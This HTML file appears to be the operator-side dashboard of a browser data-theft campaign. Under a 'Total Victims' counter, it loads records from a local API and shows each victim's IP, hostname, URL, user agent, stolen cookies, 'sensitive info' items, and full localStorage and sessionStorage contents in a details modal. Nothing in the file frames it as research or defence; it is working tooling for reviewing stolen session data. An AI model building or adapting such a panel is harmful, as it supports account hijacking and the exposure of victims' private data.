<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Admin Dashboard</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #1a1a1a; color: #fff; padding: 20px; }
        .container { max-width: 1200px; margin: 0 auto; }
        .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #333; padding-bottom: 20px; margin-bottom: 20px; }
        .stat-box { background: #333; padding: 15px; border-radius: 8px; text-align: center; }
        .stat-number { font-size: 2em; font-weight: bold; color: #00ff88; }
        table { width: 100%; border-collapse: collapse; background: #222; border-radius: 8px; overflow: hidden; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #333; }
        th { background: #333; }
        tr:hover { background: #2a2a2a; }
        .btn { background: #007bff; color: white; border: none; padding: 5px 10px; cursor: pointer; border-radius: 4px; }
        .details-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 1000; }
        .modal-content { background: #222; margin: 10% auto; padding: 20px; width: 80%; max-height: 80%; overflow-y: auto; border-radius: 8px; }
        .close { float: right; font-size: 28px; cursor: pointer; }
        pre { background: #111; padding: 10px; overflow-x: auto; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔓 Data Center</h1>
            <div class="stat-box">
                <div>Total Victims</div>
                <div class="stat-number" id="total-victims">0</div>
            </div>
        </div>

        <table>
            <thead>
                <tr>
                    <th>Time</th>
                    <th>IP Address</th>
                    <th>Hostname</th>
                    <th>Cookies</th>
                    <th>Sensitive Info</th>
                    <th>Action</th>
                </tr>
            </thead>
            <tbody id="data-table"></tbody>
        </table>
    </div>

    <!-- Modal -->
    <div id="modal" class="details-modal">
        <div class="modal-content">
            <span class="close" onclick="document.getElementById('modal').style.display='none'">&times;</span>
            <h2>Victim Details</h2>
            <div id="modal-body"></div>
        </div>
    </div>

    <script>
        fetch('/api/dashboard')
            .then(res => res.json())
            .then(data => {
                document.getElementById('total-victims').innerText = data.length;
                const tbody = document.getElementById('data-table');
                
                data.forEach(item => {
                    const row = document.createElement('tr');
                    row.innerHTML = `
                        <td>${new Date(item.timestamp).toLocaleString()}</td>
                        <td>${item.ip}</td>
                        <td>${item.hostname}</td>
                        <td>${item.cookies ? item.cookies.split(';').length : 0}</td>
                        <td>${(item.sensitiveInfo || []).length} items</td>
                        <td><button class="btn" onclick="showDetails(${JSON.stringify(item).replace(/"/g, '&quot;')})">View</button></td>
                    `;
                    tbody.appendChild(row);
                });
            })
            .catch(err => console.error('Error:', err));

        function showDetails(data) {
            const modal = document.getElementById('modal');
            const body = document.getElementById('modal-body');
            
            body.innerHTML = `
                <p><strong>IP:</strong> ${data.ip}</p>
                <p><strong>URL:</strong> ${data.url}</p>
                <p><strong>User Agent:</strong> ${data.userAgent}</p>
                <h3>Cookies</h3>
                <pre>${data.cookies || 'None'}</pre>
                <h3>Sensitive Info</h3>
                <ul>
                    ${(data.sensitiveInfo || []).map(i => `<li><strong>${i.type}</strong>: ${i.value}</li>`).join('')}
                </ul>
                <h3>LocalStorage</h3>
                <pre>${JSON.stringify(data.storage?.localStorage || {}, null, 2)}</pre>
                <h3>SessionStorage</h3>
                <pre>${JSON.stringify(data.storage?.sessionStorage || {}, null, 2)}</pre>
            `;
            modal.style.display = 'block';
        }
    </script>
</body>
</html>
